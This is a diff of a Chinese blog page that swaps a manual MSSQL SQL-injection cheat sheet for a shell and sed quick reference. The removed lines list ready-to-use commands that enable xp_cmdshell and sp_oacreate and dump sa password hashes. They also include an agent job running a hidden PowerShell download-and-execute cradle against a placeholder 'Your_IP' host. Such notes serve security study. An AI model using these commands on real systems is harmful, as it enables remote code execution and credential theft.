@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>手工SQLi语句备忘录 | Curtain&#39;s Blog</title>
-  <meta name="keywords" content=" SQLi ">
-  <meta name="description" content="手工SQLi语句备忘录 | Curtain&#39;s Blog">
+  <title>Curtain&#39;s Blog</title>
+  <meta name="keywords" content="">
+  <meta name="description" content="Curtain&#39;s Blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="手工SQLi语句备忘录MSSQL获取数据库数量select count(name) from master..sysdatabases; 查询库名select name from master..sysdatabases;select DB_NAME(i); 查询表数量SELECT count(name) FROM master..sysobjects where xtype &#x3D;&#39;u&amp;#3">
 <meta property="og:type" content="article">
@@ -254,34 +254,17 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-手工SQLi语句备忘录" class="article article-type-post" itemscope itemprop="blogPost">
-    
-        <h1 class="article-title">手工SQLi语句备忘录</h1>
+        <article id="post-shell脚本速查" class="article article-type-post" itemscope itemprop="blogPost">
     
     <div class="article-meta">
         
         
         
-        <span class="book">
-            <i class="iconfont icon-category"></i>
-            
-            
-            <a  data-rel="Notes">Notes</a>
-            
-        </span>
-        
-        
-        <span class="tag">
-            <i class="iconfont icon-tag"></i>
-            
-            <a class="color5">SQLi</a>
-            
-        </span>
         
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2021-05-31 10:27:27'>2021-05-31 10:27</time>
+            发布时间 : <time class="date" title='最后更新: 2021-05-31 11:10:09'>2021-05-13 10:27</time>
         
     </div>
     <div class="article-meta">
@@ -303,7 +286,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5SQLi%E8%AF%AD%E5%8F%A5%E5%A4%87%E5%BF%98%E5%BD%95"><span class="toc-text">手工SQLi语句备忘录</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#MSSQL"><span class="toc-text">MSSQL</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E6%95%B0%E9%87%8F"><span class="toc-text">获取数据库数量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E5%BA%93%E5%90%8D"><span class="toc-text">查询库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E8%A1%A8%E6%95%B0%E9%87%8F"><span class="toc-text">查询表数量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E8%A1%A8%E5%90%8D"><span class="toc-text">查询表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E5%88%97%E5%90%8D%E6%95%B0%E9%87%8F"><span class="toc-text">查询列名数量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E5%88%97%E5%90%8D"><span class="toc-text">查询列名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E6%96%87%E4%BB%B6"><span class="toc-text">读文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cmdshell%E7%A1%AE%E8%AE%A4"><span class="toc-text">cmdshell确认</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-text">执行命令</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#xp-cmdshell"><span class="toc-text">xp_cmdshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sp-oacreate"><span class="toc-text">sp_oacreate</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8sp-oacreate%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C"><span class="toc-text">使用sp_oacreate执行文件操作</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#agent-job"><span class="toc-text">agent job</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96sa%E5%AF%86%E7%A0%81"><span class="toc-text">读取sa密码</span></a></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#shell%E8%84%9A%E6%9C%AC%E9%80%9F%E6%9F%A5"><span class="toc-text">shell脚本速查</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#shell%E8%84%9A%E6%9C%AC"><span class="toc-text">shell脚本</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sed%E4%BD%BF%E7%94%A8"><span class="toc-text">sed使用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%93%E5%8D%B0%E8%A1%8C"><span class="toc-text">打印行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A0%E9%99%A4%E8%A1%8C"><span class="toc-text">删除行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-text">重定向</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9B%BF%E6%8D%A2"><span class="toc-text">替换</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A1%8C%E5%90%8E%E5%A2%9E%E5%8A%A0"><span class="toc-text">行后增加</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A1%8C%E5%89%8D%E6%8F%92%E5%85%A5%E8%AF%AD%E6%B3%95"><span class="toc-text">行前插入语法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E8%A1%8C%E8%AF%AD%E6%B3%95"><span class="toc-text">修改行语法</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -319,51 +302,120 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="手工SQLi语句备忘录"><a href="#手工SQLi语句备忘录" class="headerlink" title="手工SQLi语句备忘录"></a>手工SQLi语句备忘录</h1><h2 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h2><h3 id="获取数据库数量"><a href="#获取数据库数量" class="headerlink" title="获取数据库数量"></a>获取数据库数量</h3><p><code>select count(name) from master..sysdatabases;</code></p>
-<h3 id="查询库名"><a href="#查询库名" class="headerlink" title="查询库名"></a>查询库名</h3><p><code>select name from master..sysdatabases;</code><br><code>select DB_NAME(i);</code></p>
-<h3 id="查询表数量"><a href="#查询表数量" class="headerlink" title="查询表数量"></a>查询表数量</h3><p><code>SELECT count(name) FROM master..sysobjects where xtype =&#39;u&#39;;</code></p>
-<h3 id="查询表名"><a href="#查询表名" class="headerlink" title="查询表名"></a>查询表名</h3><p><code>select name from master..sysobjects where xtype=&#39;U&#39;;</code>  </p>
-<h3 id="查询列名数量"><a href="#查询列名数量" class="headerlink" title="查询列名数量"></a>查询列名数量</h3><p><code>SELECT COUNT(name) FROM master..syscolumns WHERE id = (SELECT id FROM master..syscolumns WHERE name = &#39;model&#39;);</code></p>
-<h3 id="查询列名"><a href="#查询列名" class="headerlink" title="查询列名"></a>查询列名</h3><p><code>SELECT name FROM master..syscolumns WHERE id = (SELECT id FROM master..syscolumns WHERE name = &#39;tablename&#39;);</code> </p>
-<h3 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h3><pre><code>CREATE TABLE mydata (line varchar(8000));
-BULK INSERT mydata FROM &quot;c:/exp.txt&quot;;
-SELECT * FROM mydata;
-DROP TABLE mydata;
-</code></pre>
-<h3 id="cmdshell确认"><a href="#cmdshell确认" class="headerlink" title="cmdshell确认"></a>cmdshell确认</h3><p><code>select count(*) from master..sysobjects where xtype=&#39;x&#39; and name=&#39;xp_cmdshell&#39;;</code></p>
-<h3 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h3><h4 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h4><ol>
-<li>启用cmdshell<br><code>EXEC sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;EXEC sp_configure &#39;xp_cmdshell&#39;, 1;RECONFIGURE;</code></li>
-<li>执行命令<br><code>EXEC master.dbo.xp_cmdshell &quot;whoami&quot;;</code></li>
-</ol>
-<h4 id="sp-oacreate"><a href="#sp-oacreate" class="headerlink" title="sp_oacreate"></a>sp_oacreate</h4><ol>
-<li>开启sp_oacreate <pre><code>EXEC sp_configure &#39;show advanced options&#39;, 1;   
-RECONFIGURE WITH OVERRIDE;   
-EXEC sp_configure &#39;Ole Automation Procedures&#39;, 1;   
-RECONFIGURE WITH OVERRIDE;   
-EXEC sp_configure &#39;show advanced options&#39;, 0;
-</code></pre>
-</li>
-<li>执行命令<br><code>declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe /c whoami &gt;c:\\\1.txt&#39;</code></li>
-</ol>
-<h5 id="使用sp-oacreate执行文件操作"><a href="#使用sp-oacreate执行文件操作" class="headerlink" title="使用sp_oacreate执行文件操作"></a>使用sp_oacreate执行文件操作</h5><ul>
-<li>复制文件<br><code>DECLARE @o INT EXEC sp_oacreate &#39;scripting.filesystemobject&#39;, @o out exec sp_oamethod @o, &#39;copyfile&#39;,null,&#39;c:\1.txt&#39;,&#39;c:\2.txt&#39;;</code></li>
-<li>删除文件<br><code>DECLARE @d INT DECLARE @FSO_Token INT EXEC @d=sp_oacreate &#39;scripting.filesystemobject&#39;,@FSO_Token OUTPUT EXEC @d=sp_oamethod @FSO_Token, &#39;deletefile&#39;,null,&#39;c:\2.txt&#39; EXEC @d = sp_oadestroy @FSO_Token</code></li>
-<li>移动文件<br><code>DECLARE @m INT EXEC sp_oacreate &#39;scripting.filesystemobject&#39;,@m OUT EXEC sp_oamethod @m, &#39;movefile&#39;,null,&#39;c:\1.txt&#39;,&#39;c:\2.txt&#39;</code></li>
+        <h2 id="shell脚本速查"><a href="#shell脚本速查" class="headerlink" title="shell脚本速查"></a>shell脚本速查</h2><p>title: shell脚本速查<br>date: 1620872846631<br>categories:</p>
+<ul>
+<li>Notes<br>tags:</li>
+<li>shell</li>
 </ul>
-<h4 id="agent-job"><a href="#agent-job" class="headerlink" title="agent job"></a>agent job</h4><pre><code>USE msdb;
-EXEC dbo.sp_add_job @job_name = N&#39;clay_powershell_job1&#39; ; 
-EXEC sp_add_jobstep 
-    @job_name = N&#39;clay_powershell_job1&#39;, 
-    @step_name = N&#39;clay_powershell_name1&#39;, 
-    @subsystem = N&#39;PowerShell&#39;, 
-    @command = N&#39;powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;&#39;http://Your_IP/Your_file&#39;&#39;))&quot;&#39;, 
-    @retry_attempts = 1, 
-    @retry_interval = 5;
-EXEC dbo.sp_add_jobserver 
-    @job_name = N&#39;clay_powershell_job1&#39;; 
-EXEC dbo.sp_start_job N&#39;clay_powershell_job1&#39;;
+<hr>
+<h1 id="shell脚本"><a href="#shell脚本" class="headerlink" title="shell脚本"></a>shell脚本</h1><pre><code>var=&quot;123&quot;
+`ls -al` == $(ls -al)
+echo $var === echo $&#123;var&#125;
+获取字符段长度
+length=$&#123;#string&#125;
+:&lt;&lt;EOF
+注释内容
+EOF
+
+关系运算符
+-eq    检测两个数是否相等，相等返回 true。    [ $a -eq $b ] 返回 false。
+-ne    检测两个数是否不相等，不相等返回 true。    [ $a -ne $b ] 返回 true。
+-gt    检测左边的数是否大于右边的，如果是，则返回 true。    [ $a -gt $b ] 返回 false。
+-lt    检测左边的数是否小于右边的，如果是，则返回 true。    [ $a -lt $b ] 返回 true。
+-ge    检测左边的数是否大于等于右边的，如果是，则返回 true。    [ $a -ge $b ] 返回 false。
+-le    检测左边的数是否小于等于右边的，如果是，则返回 true。    [ $a -le $b ] 返回 true。
+
+布尔运算符
+运算符
+!    非运算，表达式为 true 则返回 false，否则返回 true。    [ ! false ] 返回 true。
+-o    或运算，有一个表达式为 true 则返回 true。    [ $a -lt 20 -o $b -gt 100 ] 返回 true。
+-a    与运算，两个表达式都为 true 才返回 true。    [ $a -lt 20 -a $b -gt 100 ] 返回 false。
+
+字符串运算符
+运算符
+=    检测两个字符串是否相等，相等返回 true。    [ $a = $b ] 返回 false。
+!=    检测两个字符串是否不相等，不相等返回 true。    [ $a != $b ] 返回 true。
+-z    检测字符串长度是否为0，为0返回 true。    [ -z $a ] 返回 false。
+-n    检测字符串长度是否不为 0，不为 0 返回 true。    [ -n &quot;$a&quot; ] 返回 true。
+$    检测字符串是否为空，不为空返回 true。    [ $a ] 返回 true。
+
+文件测试运算符
+操作符
+-b file    检测文件是否是块设备文件，如果是，则返回 true。    [ -b $file ] 返回 false。
+-c file    检测文件是否是字符设备文件，如果是，则返回 true。    [ -c $file ] 返回 false。
+-d file    检测文件是否是目录，如果是，则返回 true。    [ -d $file ] 返回 false。
+-f file    检测文件是否是普通文件（既不是目录，也不是设备文件），如果是，则返回 true。    [ -f $file ] 返回 true。
+-g file    检测文件是否设置了 SGID 位，如果是，则返回 true。    [ -g $file ] 返回 false。
+-k file    检测文件是否设置了粘着位(Sticky Bit)，如果是，则返回 true。    [ -k $file ] 返回 false。
+-p file    检测文件是否是有名管道，如果是，则返回 true。    [ -p $file ] 返回 false。
+-u file    检测文件是否设置了 SUID 位，如果是，则返回 true。    [ -u $file ] 返回 false。
+-r file    检测文件是否可读，如果是，则返回 true。    [ -r $file ] 返回 true。
+-w file    检测文件是否可写，如果是，则返回 true。    [ -w $file ] 返回 true。
+-x file    检测文件是否可执行，如果是，则返回 true。    [ -x $file ] 返回 true。
+-s file    检测文件是否为空（文件大小是否大于0），不为空返回 true。    [ -s $file ] 返回 true。
+-e file    检测文件（包括目录）是否存在，如果是，则返回 true。    [ -e $file ] 返回 true。
+
+将stdout和stderr重定向到file
+command &gt; file 2&gt;&amp;1
+屏蔽stdout和stderr
+command &gt; /dev/null 2&gt;&amp;1
 </code></pre>
-<h3 id="读取sa密码"><a href="#读取sa密码" class="headerlink" title="读取sa密码"></a>读取sa密码</h3><p><code>select name,master.sys.fn_sqlvarbasetostr(password_hash) from master.sys.sql_logins</code></p>
+<h1 id="sed使用"><a href="#sed使用" class="headerlink" title="sed使用"></a>sed使用</h1><h2 id="打印行"><a href="#打印行" class="headerlink" title="打印行"></a>打印行</h2><pre><code>sed -n -e &#39;/^root/ p&#39; /etc/passwd == sed -n &#39;&#123;/^root/ p&#125;&#39; /etc/passwd
+/^root/:root开头 /nobody$/:nobody结尾
+sed -n &#39;开始行,结束行 p&#39; FILE  开始行和结束行可以是行号也可以是关键字
+# 寻找包含Paul的行
+$sed -n &#39;/Paul/ p&#39; source.txt
+# 从第一行开始到第五行, 从找到开始打印到第五行
+$sed -n &#39;/Paul/,5 p&#39; source.txt
+# 从匹配Paul行打印达匹配Addy的行
+$sed -n &#39;/Paul/,/Addy/ p&#39; source.txt
+# 在freebsd版sed不能用 匹配Paul行再多输出2行
+$/usr/local/bin/sed -n &#39;/Paul/,+2 p&#39; source.txt
+</code></pre>
+<h2 id="删除行"><a href="#删除行" class="headerlink" title="删除行"></a>删除行</h2><pre><code>删除全部行
+sed &#39;d&#39; source.txt 
+删除空行
+$sed &#39;/^$/ d&#39; source.txt
+删除评论行
+$sed &#39;/^#/ d&#39; source.txt
+</code></pre>
+<h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><pre><code>将内容重定向写到output.txt
+sed &#39;w output.txt&#39; source.txt
+将匹配到关键字的行写到output.txt
+sed -n &#39;/Ask/,$ w output.txt&#39;
+</code></pre>
+<h2 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h2><pre><code>sed &#39;[address-range|pattern-range] s/original-
+string/replacement-string/[substitute-flags]&#39; inputfile
+将Google替换为GitHub
+sed &#39;s/Google/Github/&#39; source.txt
+替换匹配Addy的行里面的Google为Github
+sed &#39;/Addy/s/Google/Github/&#39; source.txt
+g可以替换每行的全部符合
+sed &#39;s/a/A/g&#39;  source.txt
+指定替换第二个匹配项
+sed &#39;s/a/A/2&#39;  source.txt
+替换指定内容给两边加上&lt;&gt;
+sed &#39;s/^.*/&lt;&amp;&gt;/&#39; FILE
+修改源文件
+sed -i
+sed -ibak
+</code></pre>
+<h2 id="行后增加"><a href="#行后增加" class="headerlink" title="行后增加"></a>行后增加</h2><pre><code>sed &#39;[address] a the-line-to-append&#39; input-file
+sed &#39;2 a 108,Donald Stufft, Nebula&#39; source.txt
+101,IAN Bicking,Mozilla
+102,Hakim El Hattab,Whim
+108,Donald Stufft, Nebula
+</code></pre>
+<h2 id="行前插入语法"><a href="#行前插入语法" class="headerlink" title="行前插入语法"></a>行前插入语法</h2><pre><code>sed &#39;2 i 108,Donald Stufft, Nebula&#39; source.txt
+101,IAN Bicking,Mozilla
+108,Donald Stufft, Nebula
+102,Hakim El Hattab,Whim
+</code></pre>
+<h2 id="修改行语法"><a href="#修改行语法" class="headerlink" title="修改行语法"></a>修改行语法</h2><pre><code>sed &#39;/Paul/ c 108,Donald Stufft, Nebula&#39; source.txt
+101,IAN Bicking,Mozilla
+102,Hakim El Hattab,Whim
+108,Donald Stufft, Nebula
+</code></pre>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件联系 </span>
